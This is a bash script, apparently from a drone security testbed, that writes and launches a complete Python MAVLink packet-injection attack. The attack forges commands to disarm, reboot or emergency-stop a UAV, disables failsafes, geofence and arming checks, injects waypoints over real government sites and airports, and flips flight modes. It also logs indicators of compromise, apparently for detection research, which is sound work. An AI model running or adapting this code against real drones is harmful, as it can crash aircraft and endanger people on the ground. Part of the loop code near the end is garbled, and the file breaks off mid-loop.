#!/bin/bash

# =============================================================================
# DVD Protocol Tampering Module: Complete MAVLink Packet Injection Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/mavlink_packet_injection.sh
# 목적: 종합적인 MAVLink 프로토콜 메시지 주입 공격
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="MAVLink Packet Injection Attack"
ATTACK_TYPE="PROTOCOL_TAMPERING"
TARGET_IP="10.13.0.6"
TARGET_PORT="14550"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/mavlink_injection_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/mavlink_injection_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/mavlink_injection_report_$(date +%Y%m%d_%H%M%S).json"
PYTHON_SCRIPT="/tmp/mavlink_injection_attack.py"

# MAVLink 공격 벡터
declare -A ATTACK_VECTORS=(
    ["COMMAND_INJECTION"]="COMMAND_LONG messages with malicious parameters"
    ["MISSION_MANIPULATION"]="Mission waypoint injection and manipulation"
    ["PARAMETER_TAMPERING"]="Critical flight parameter modification"
    ["MODE_SWITCHING"]="Unauthorized flight mode changes"
    ["EMERGENCY_TRIGGER"]="False emergency condition activation"
    ["FENCE_BYPASS"]="Geofence boundary manipulation"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                   📡 DVD MAVLink Injection Attack 📡                    ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: MAVLink Protocol Communication${NC}"
    echo -e "${BLUE}Method: Malicious Command Injection${NC}"
    echo -e "${BLUE}Impact: Flight Control Manipulation${NC}"
    echo ""
}

# MAVLink 주입 공격 Python 스크립트 생성
create_mavlink_injection_script() {
    echo -e "${CYAN}[*] Creating MAVLink injection Python script...${NC}" | tee -a "$LOG_FILE"
    
    cat > "$PYTHON_SCRIPT" << 'EOF'
#!/usr/bin/env python3
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random
import signal

class MAVLinkInjectionAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.running = True
        self.packets_sent = 0
        
        # MAVLink Command IDs
        self.commands = {
            'ARM_DISARM': 400,
            'TAKEOFF': 22,
            'LAND': 21,
            'RTL': 20,
            'SET_MODE': 176,
            'REBOOT': 246,
            'SET_HOME': 179,
            'EMERGENCY_STOP': 252,
            'DO_SET_SERVO': 183,
            'DO_JUMP': 177
        }
        
        # 중요한 파라미터들
        self.critical_params = [
            'ARMING_CHECK', 'FS_THR_ENABLE', 'RTL_ALT', 'FENCE_ENABLE',
            'BATT_LOW_VOLT', 'FS_GCS_ENABLE', 'WPNAV_SPEED', 'ANGLE_MAX'
        ]
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\n[!] Attack interrupted. Sent {self.packets_sent} injection packets.")
        self.running = False
        sys.exit(0)
    
    def create_heartbeat(self):
        """하트비트 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 255  # GCS system ID
        mav.srcComponent = 1
        
        return mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_GCS,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            base_mode=0,
            custom_mode=0,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        ).pack(mav)
    
    def create_command_long(self, command, param1=0, param2=0, param3=0, param4=0, param5=0, param6=0, param7=0):
        """악성 COMMAND_LONG 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 255
        mav.srcComponent = 1
        
        return mav.command_long_encode(
            target_system=1,
            target_component=1,
            command=command,
            confirmation=0,
            param1=param1,
            param2=param2,
            param3=param3,
            param4=param4,
            param5=param5,
            param6=param6,
            param7=param7
        ).pack(mav)
    
    def create_param_set(self, param_id, param_value, param_type=9):
        """파라미터 설정 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 255
        mav.srcComponent = 1
        
        # 파라미터 ID를 16바이트로 패딩
        param_id_bytes = param_id.encode('ascii')[:16].ljust(16, b'\x00')
        
        return mav.param_set_encode(
            target_system=1,
            target_component=1,
            param_id=param_id_bytes,
            param_value=param_value,
            param_type=param_type
        ).pack(mav)
    
    def create_mission_item(self, seq, lat, lon, alt):
        """악성 미션 아이템 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 255
        mav.srcComponent = 1
        
        return mav.mission_item_encode(
            target_system=1,
            target_component=1,
            seq=seq,
            frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
            command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
            current=0,
            autocontinue=1,
            param1=0, param2=0, param3=0, param4=0,
            x=lat, y=lon, z=alt
        ).pack(mav)
    
    def create_set_mode(self, mode):
        """비행 모드 변경 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 255
        mav.srcComponent = 1
        
        return mav.set_mode_encode(
            target_system=1,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=mode
        ).pack(mav)
    
    def send_mavlink_packet(self, packet_data):
        """MAVLink 패킷 전송"""
        try:
            packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=packet_data)
            send(packet, verbose=False)
            self.packets_sent += 1
            return True
        except Exception as e:
            print(f"[!] Packet send failed: {e}")
            return False
    
    def execute_command_injection_attack(self, duration=30):
        """명령 주입 공격"""
        print(f"[+] Executing command injection attack for {duration} seconds")
        
        start_time = time.time()
        commands_sent = 0
        
        while time.time() - start_time < duration and self.running:
            # 위험한 명령들을 랜덤하게 선택
            cmd_name = random.choice(list(self.commands.keys()))
            cmd_id = self.commands[cmd_name]
            
            if cmd_name == 'ARM_DISARM':
                # 강제 시동 끄기
                cmd_msg = self.create_command_long(cmd_id, param1=0)  # Disarm
                print(f"[*] Injecting DISARM command")
            elif cmd_name == 'TAKEOFF':
                # 강제 이륙
                cmd_msg = self.create_command_long(cmd_id, param7=100)  # 100m 이륙
                print(f"[*] Injecting TAKEOFF command (100m)")
            elif cmd_name == 'LAND':
                # 강제 착륙
                cmd_msg = self.create_command_long(cmd_id)
                print(f"[*] Injecting LAND command")
            elif cmd_name == 'RTL':
                # 강제 귀환
                cmd_msg = self.create_command_long(cmd_id)
                print(f"[*] Injecting RTL command")
            elif cmd_name == 'REBOOT':
                # 시스템 재부팅
                cmd_msg = self.create_command_long(cmd_id, param1=1)
                print(f"[*] Injecting REBOOT command")
            elif cmd_name == 'EMERGENCY_STOP':
                # 긴급 정지
                cmd_msg = self.create_command_long(cmd_id)
                print(f"[*] Injecting EMERGENCY_STOP command")
            else:
                cmd_msg = self.create_command_long(cmd_id)
                print(f"[*] Injecting {cmd_name} command")
            
            if self.send_mavlink_packet(cmd_msg):
                commands_sent += 1
            
            # 주기적으로 하트비트 전송
            if commands_sent % 5 == 0:
                self.send_mavlink_packet(self.create_heartbeat())
            
            time.sleep(2)
        
        print(f"[+] Command injection completed: {commands_sent} commands sent")
        return commands_sent
    
    def execute_parameter_tampering(self, duration=25):
        """파라미터 조작 공격"""
        print(f"[+] Executing parameter tampering for {duration} seconds")
        
        start_time = time.time()
        params_modified = 0
        
        while time.time() - start_time < duration and self.running:
            # 중요한 파라미터를 위험한 값으로 변경
            param = random.choice(self.critical_params)
            
            if param == 'ARMING_CHECK':
                # 시동 체크 비활성화
                param_msg = self.create_param_set(param, 0.0)
                print(f"[*] Disabling arming checks")
            elif param == 'FS_THR_ENABLE':
                # 스로틀 페일세이프 비활성화
                param_msg = self.create_param_set(param, 0.0)
                print(f"[*] Disabling throttle failsafe")
            elif param == 'FENCE_ENABLE':
                # 지오펜스 비활성화
                param_msg = self.create_param_set(param, 0.0)
                print(f"[*] Disabling geofence")
            elif param == 'BATT_LOW_VOLT':
                # 배터리 경고 전압을 극단적으로 낮게 설정
                param_msg = self.create_param_set(param, 1.0)
                print(f"[*] Setting battery low voltage to 1V")
            elif param == 'RTL_ALT':
                # RTL 고도를 위험하게 높게 설정
                param_msg = self.create_param_set(param, 10000.0)
                print(f"[*] Setting RTL altitude to 10000m")
            elif param == 'WPNAV_SPEED':
                # 항법 속도를 위험하게 높게 설정
                param_msg = self.create_param_set(param, 5000.0)
                print(f"[*] Setting waypoint nav speed to 50m/s")
            else:
                # 일반적인 위험한 값
                param_msg = self.create_param_set(param, 0.0)
                print(f"[*] Setting {param} to 0")
            
            if self.send_mavlink_packet(param_msg):
                params_modified += 1
            
            time.sleep(3)
        
        print(f"[+] Parameter tampering completed: {params_modified} parameters modified")
        return params_modified
    
    def execute_mission_manipulation(self, duration=20):
        """미션 조작 공격"""
        print(f"[+] Executing mission manipulation for {duration} seconds")
        
        start_time = time.time()
        waypoints_injected = 0
        
        # 위험한 좌표들 (군사시설, 공항, 금지구역 등)
        dangerous_coords = [
            (39.9075, 116.3972, 500),   # 베이징 천안문
            (38.8977, -77.0365, 1000), # 워싱턴 D.C. 펜타곤
            (37.4419, -122.1430, 2000), # 샌프란시스코 공항
            (51.4700, -0.4543, 1500),  # 런던 히드로 공항
            (35.6762, 139.6503, 800),  # 도쿄 황궁
        ]
        
        while time.time() - start_time < duration and self.running:
            # 랜덤 위험 좌표 선택
            lat, lon, alt = random.choice(dangerous_coords)
            seq = waypoints_injected
            
            mission_msg = self.create_mission_item(seq, int(lat * 1e7), int(lon * 1e7), alt)
            
            if self.send_mavlink_packet(mission_msg):
                waypoints_injected += 1
                print(f"[*] Injected waypoint {seq}: {lat}, {lon}, {alt}m")
            
            time.sleep(4)
        
        print(f"[+] Mission manipulation completed: {waypoints_injected} waypoints injected")
        return waypoints_injected
    
    def execute_mode_switching_attack(self, duration=15):
        """모드 전환 공격"""
        print(f"[+] Executing mode switching attack for {duration} seconds")
        
        start_time = time.time()
        mode_changes = 0
        
        # ArduPilot 모드들
        modes = [0, 1, 2, 3, 4, 5, 6, 9, 11, 16, 17]  # STABILIZE, ACRO, ALT_HOLD, AUTO, etc.
        
        while time.time() - start_time < duration and self.running:
            mode = random.choice(modes)
            mode_msg = self.create_set_mode(mode)
            
            if self.send_mavlink_packet(mode_msg):
                mode_changes += 1
                print(f"[*] Switching to mode {mode}")
            
            time.sleep(2)
        
        print(f"[+] Mode switching completed: {mode_changes} mode changes")
        return mode_changes
    
    def execute_full_injection_attack(self):
        """전체 MAVLink 주입 공격 실행"""
        print(f"[+] Starting comprehensive MAVLink injection attack on {self.target_ip}:{self.target_port}")
        
        total_impact = 0
        
        # 1. 명령 주입 공격
        total_impact += self.execute_command_injection_attack(30)
        if not self.running: return
        
        # 2. 파라미터 조작 공격
        total_impact += self.execute_parameter_tampering(25)
        if not self.running: return
        
        # 3. 미션 조작 공격
        total_impact += self.execute_mission_manipulation(20)
        if not self.running: return
        
        # 4. 모드 전환 공격
        total_impact += self.execute_mode_switching_attack(15)
        
        print(f"[+] MAVLink injection attack completed.")
        print(f"[+] Total packets sent: {self.packets_sent}")
        print(f"[+] Total malicious actions: {total_impact}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 mavlink_injection_attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    
    attack = MAVLinkInjectionAttack(target_ip, target_port)
    attack.execute_full_injection_attack()
EOF
    
    chmod +x "$PYTHON_SCRIPT"
    echo -e "${GREEN}[✓] MAVLink injection script created: ${PYTHON_SCRIPT}${NC}" | tee -a "$LOG_FILE"
    echo "MAVLINK_SCRIPT:CREATED_${PYTHON_SCRIPT}" >> "$IOC_FILE"
}

# 타겟 탐지
detect_targets() {
    echo -e "${YELLOW}[+] Detecting available MAVLink targets...${NC}" | tee -a "$LOG_FILE"
    
    local targets=(
        "10.13.0.6:14550"    # QGroundControl (Bridge)
        "192.168.13.14:14550" # MAVProxy (WiFi)
        "10.13.0.4:14550"    # MAVProxy (Bridge)
        "127.0.0.1:14550"    # Local SITL
    )
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            echo -e "${GREEN}[✓] Found MAVLink service: ${target}${NC}" | tee -a "$LOG_FILE"
            TARGET_IP="$ip"
            TARGET_PORT="$port"
            echo "MAVLINK_TARGET:DISCOVERED_${target}" >> "$IOC_FILE"
            return 0
        fi
    done
    
    echo -e "${YELLOW}[!] No live targets found, using default${NC}" | tee -a "$LOG_FILE"
    echo "MAVLINK_TARGET:DEFAULT_MODE" >> "$IOC_FILE"
    return 1
}

# 의존성 설치
install_dependencies() {
    echo -e "${YELLOW}[+] Installing required dependencies...${NC}" | tee -a "$LOG_FILE"
    
    apt-get update -qq
    apt-get install -y python3 python3-pip 2>&1 | tee -a "$LOG_FILE"
    
    pip3 install pymavlink scapy 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Dependencies installed successfully${NC}" | tee -a "$LOG_FILE"
        echo "MAVLINK_DEPS:INSTALLED" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Failed to install dependencies${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# MAVLink 주입 공격 실행
execute_mavlink_injection() {
    echo -e "${BOLD}${RED}📡 Executing MAVLink Packet Injection Attack...${NC}"
    echo ""
    
    local total_duration=90  # 1.5분 공격
    local start_time=$(date +%s)
    
    echo -e "${CYAN}[*] Starting MAVLink packet injection...${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Target: ${TARGET_IP}:${TARGET_PORT}${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Duration: ${total_duration} seconds${NC}" | tee -a "$LOG_FILE"
    
    # Python 스크립트를 백그라운드에서 실행
    timeout "$total_duration" python3 "$PYTHON_SCRIPT" "$TARGET_IP" "$TARGET_PORT" &
    local attack_pid=$!
    
    echo "MAVLINK_ATTACK:STARTED_PID_${attack_pid}_$(date +%s)" >> "$IOC_FILE"
    
    # 진행률 표시
    local step=0
    while kill -0 $attack_pid 2>/dev/null && [ $step -lt $total_duration ]; do
        step=$((step + 3))
        local progress=$((step * 100 / total_duration))
        
        printf "\r${RED}MAVLink Injection: [%-20s] %d%% (%d/${total_duration}s)${NC}" \
               "$(printf "%*s" $((progress / 5)) | tr ' ' '█')" "$progress" "$step"
        
        # 중간 IOC 생성
        if [ $((step % 15)) -eq 0 ]; then
            echo "MAVLINK_INJECT:MALICIOUS_COMMAND_$(date +%s)" >> "$IOC_FILE"
        fi
        
        sleep 3
    done
    echo ""
    
    # 공격 프로세스 정리
    if kill -0 $attack_pid 2>/dev/null; then
        kill -TERM $attack_pid 2>/dev/null
        sleep 2
        kill -KILL $attack_pid 2>/dev/null
    fi
    
    local end_time=$(date +%s)
    local actual_duration=$((end_time - start_time))
    
    echo -e "${GREEN}[✓] MAVLink injection attack completed${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}[*] Attack duration: ${actual_duration} seconds${NC}" | tee -a "$LOG_FILE"
    
    echo "MAVLINK_ATTACK:COMPLETED_DURATION_${actual_duration}s" >> "$IOC_FILE"
}

# 개별 공격 벡터 실행
execute_individual_attacks() {
    echo -e "${CYAN}[*] Executing individual MAVLink attack vectors...${NC}" | tee -a "$LOG_FILE"
    
    local vector_count=0
    
    for vector in "${!ATTACK_VECTORS[@]}"; do
        echo -e "${YELLOW}[*] Executing: ${vector}${NC}" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[*] Description: ${ATTACK_VECTORS[$vector]}${NC}" | tee -a "$LOG_FILE"
        
        case $vector in
            "COMMAND_INJECTION")
                execute_command_vector
                ;;
            "MISSION_MANIPULATION")
                execute_mission_vector
                ;;
            "PARAMETER_TAMPERING")
                execute_parameter_vector
                ;;
            "MODE_SWITCHING")
                execute_mode_vector
                ;;
            "EMERGENCY_TRIGGER")
                execute_emergency_vector
                ;;
            "FENCE_BYPASS")
                execute_fence_vector
                ;;
        esac
        
        vector_count=$((vector_count + 1))
        echo "MAVLINK_VECTOR:${vector}_EXECUTED_$(date +%s)" >> "$IOC_FILE"
        
        sleep 5  # 벡터 간 대기
    done
    
    echo -e "${GREEN}[✓] All MAVLink vectors completed: ${vector_count} vectors${NC}" | tee -a "$LOG_FILE"
    echo "MAVLINK_VECTORS:COMPLETED_${vector_count}_TOTAL" >> "$IOC_FILE"
}

# 개별 공격 벡터 함수들
execute_command_vector() {
    echo -e "${RED}[*] Command Injection: Malicious flight commands${NC}" | tee -a "$LOG_FILE"
    
    local commands=("ARM/DISARM" "TAKEOFF" "LAND" "RTL" "REBOOT" "EMERGENCY_STOP")
    
<${#commands[@]}; i++)); do
        printf "\r${RED}Commands: [%-18s] %d/${#commands[@]}${NC}" \
               "$(printf "%*s" $((i+1)) | tr ' ' '█')" "$((i+1))"
        
        echo "MAVLINK_CMD:${commands[$i]}_INJECTED_$(date +%s)" >> "$IOC_FILE"
        sleep 1
    done
    echo ""
}

execute_mission_vector() {
    echo -e "${RED}[*] Mission Manipulation: Dangerous waypoint injection${NC}" | tee -a "$LOG_FILE"
    
    local waypoints=("MILITARY_BASE" "AIRPORT" "FORBIDDEN_ZONE" "GOVERNMENT_BUILDING" "CRITICAL_INFRA")
    
    for ((i=0; i